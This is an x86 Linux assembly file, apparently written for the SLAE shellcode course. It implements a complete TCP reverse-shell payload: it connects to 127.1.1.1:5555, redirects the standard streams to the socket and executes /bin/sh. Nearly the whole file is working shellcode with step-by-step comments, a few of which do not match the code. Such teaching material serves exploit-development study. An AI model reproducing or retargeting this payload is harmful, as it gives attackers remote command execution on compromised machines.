; Linux/x86 TCP Reverse Shell assembly shellcode
; Author SLAE - 926 for SecurityTube Linux Assembly Expert course

global _start

section .text

_start:

; set port number
	push 0x0101017f	; 127.1.1.1 in little endian format
	pop edi
	push word 0xB315 ; port to 5555 in little endian format
	pop ebp

; SOCKET
; int socket(int domain, int type, int protocol);

	xor eax, eax ; eax = 00000000
	push eax ; protocol IP = 00000000
	inc eax ; eax = 00000001
	push eax ; prepare to pop 00000001 to ebx
	pop ebx ; SYS_SOCKET = 00000001 (1) /usr/include/linux/net.h
	push eax ; SOCK_STREAM = 00000001 /usr/include/i386-linux-gnu/bits/socket.h
	push byte 0x2 ; AF_INET = 00000002 /usr/include/i386-linux-gnu/bits/socket.h
	
	mov al, 0x66 ; SYS_SOCKETCALL 102 = 0x66 /usr/include/i386-linux-gnu/asm/unistd_32.h
	mov ecx, esp ; set ecx to point to top of the stack SYS_SOCKET
	int 0x80 ; invoke socketcall SYS_SOCKET
	
	xchg esi, eax ; store file descriptor for socket in esi
; CONNECT
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	pop ebx ; ebx = 00000002
	push edi ; 127.1.1.1 in little endian format
	push bp ; 5555 in little endian format
	push bx ; AF_INET = 00000002 /usr/include/i386-linux-gnu/bits/socket.h
	inc ebx ; SYS_CONNECT = 00000003 (3) /usr/include/linux/net.h
	mov ecx, esp ; pointer to const struct sockaddr *addr
	push 0x10 ; socklen_t addrlen
	push ecx ; const struct sockaddr *addr
	push esi ; sockfd
	
	mov al, 0x66 ; SYS_SOCKETCALL 102 = 0x66 /usr/include/i386-linux-gnu/asm/unistd_32.h
	mov ecx, esp ; set ecx to point to top of the stack SYS_CONNECT
	int 0x80 ; invoke socketcall SYS_CONNECT
; DUP2
; int dup2(int oldfd, int newfd);

	xchg ecx, ebx ; ebx = oldfd eax = 00000005
	xchg ebx, esi ; store 7 into ecx to save xor ecx, ecx mov cl, 0x3
	
loop:
	dec ecx ; ecx = 2 stderr, ecx = 1 stdout, ecx = 0 stdin
	mov al, 0x3f ; dup2 syscall 63 = 0x3f
	int 0x80 ; invoke dup2 syscall 
	
	jnz loop 

; EXECVE
; int execve(const char *filename, char *const argv[], char *const envp[]);
	push eax ; eax = 00000000
	push eax ; eax = 00000000
	pop ecx ; execve argv
	pop edx ; execve envp
	push eax
	push    0x68732f2f         ; "//sh"
	push    0x6e69622f         ; "/bin"
	
	mov al, 0xb ; EXECVE 11 = 0xb 
	;mov ecx, esp ; set ecx to point to top of the stack EXECVE
	xchg esp, ebx
	int 0x80 ; execve syscall

	
